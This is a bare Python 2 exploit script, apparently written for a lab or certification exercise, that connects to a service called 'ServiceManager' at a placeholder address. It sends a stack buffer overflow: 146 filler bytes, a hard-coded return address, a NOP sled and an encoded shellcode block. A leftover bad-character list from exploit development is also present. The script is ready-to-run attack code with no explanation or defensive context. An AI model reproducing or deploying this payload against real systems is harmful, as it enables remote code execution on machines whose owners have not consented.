#!/usr/bin/env python2
import socket

ServiceManagerIP = "IP"
ServiceManagerPort = PORT

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ServiceManagerIP, ServiceManagerPort))
#msg = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + "\xc3\x14\x04\x08"

prefix = "\r\n"
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 32
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buf = ("\xbb\x49\x46\xda\xcc\xda\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x0e\x03\x13\x48\x38\x39\x5f\xbc\x3e"
"\xc2\x9f\x3d\x5f\x4a\x7a\x0c\x5f\x28\x0f\x3f\x6f\x3a\x5d\xcc"
"\x04\x6e\x75\x47\x68\xa7\x7a\xe0\xc7\x91\xb5\xf1\x74\xe1\xd4"
"\x71\x87\x36\x36\x4b\x48\x4b\x37\x8c\xb5\xa6\x65\x45\xb1\x15"
"\x99\xe2\x8f\xa5\x12\xb8\x1e\xae\xc7\x09\x20\x9f\x56\x01\x7b"
"\x3f\x59\xc6\xf7\x76\x41\x0b\x3d\xc0\xfa\xff\xc9\xd3\x2a\xce"
"\x32\x7f\x13\xfe\xc0\x81\x54\x39\x3b\xf4\xac\x39\xc6\x0f\x6b"
"\x43\x1c\x85\x6f\xe3\xd7\x3d\x4b\x15\x3b\xdb\x18\x19\xf0\xaf"
"\x46\x3e\x07\x63\xfd\x3a\x8c\x82\xd1\xca\xd6\xa0\xf5\x97\x8d"
"\xc9\xac\x7d\x63\xf5\xae\xdd\xdc\x53\xa5\xf0\x09\xee\xe4\x9c"
"\xfe\xc3\x16\x5d\x69\x53\x65\x6f\x36\xcf\xe1\xc3\xbf\xc9\xf6"
"\x24\xea\xae\x68\xdb\x15\xcf\xa1\x18\x41\x9f\xd9\x89\xea\x74"
"\x19\x35\x3f\xda\x49\x99\x90\x9b\x39\x59\x41\x74\x53\x56\xbe"
"\x64\x5c\xbc\xd7\x0f\xa7\x57\xd2\x95\x9b\xf7\x8a\x2b\xe3\xd4"
"\x61\xa5\x05\x70\x66\xe3\x9e\xed\x1f\xae\x54\x8f\xe0\x64\x11"
"\x8f\x6b\x8b\xe6\x5e\x9c\xe6\xf4\x37\x6c\xbd\xa6\x9e\x73\x6b"
"\xce\x7d\xe1\xf0\x0e\x0b\x1a\xaf\x59\x5c\xec\xa6\x0f\x70\x57"
"\x11\x2d\x89\x01\x5a\xf5\x56\xf2\x65\xf4\x1b\x4e\x42\xe6\xe5"
"\x4f\xce\x52\xba\x19\x98\x0c\x7c\xf0\x6a\xe6\xd6\xaf\x24\x6e"
"\xae\x83\xf6\xe8\xaf\xc9\x80\x14\x01\xa4\xd4\x2b\xae\x20\xd1"
"\x54\xd2\xd0\x1e\x8f\x56\xf0\xfc\x05\xa3\x99\x58\xcc\x0e\xc4"
"\x5a\x3b\x4c\xf1\xd8\xc9\x2d\x06\xc0\xb8\x28\x42\x46\x51\x41"
"\xdb\x23\x55\xf6\xdc\x61")

payload = badchars + "C" * (546-146-4-254)
posttest = "\x90" * 64
postfix = "\r\n"
msg = prefix + overflow + retn + padding + buf + posttest +postfix


s.send(msg)
data = s.recv(len(msg))
s.recv(1024)
s.close()
print(data)
